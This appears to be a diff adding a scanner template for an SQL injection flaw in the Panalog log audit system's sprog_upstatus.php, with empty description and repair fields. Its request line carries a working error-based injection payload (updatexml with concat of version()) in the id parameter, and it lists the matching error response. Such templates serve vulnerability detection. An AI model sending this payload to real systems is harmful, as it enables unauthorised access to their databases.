@@ -1,0 +1,21 @@
+id:
+info:
+  name: Panalog 日志审计系统 sprog_upstatus.php SQL 注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1)
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    Accept-Encoding: gzip, deflate
+    Accept: '*/*'
+    Connection: keep-alive
+response1:
+  headers:
+  body: XPATH syntax error
+  code: 200
+requests2:
+response2:
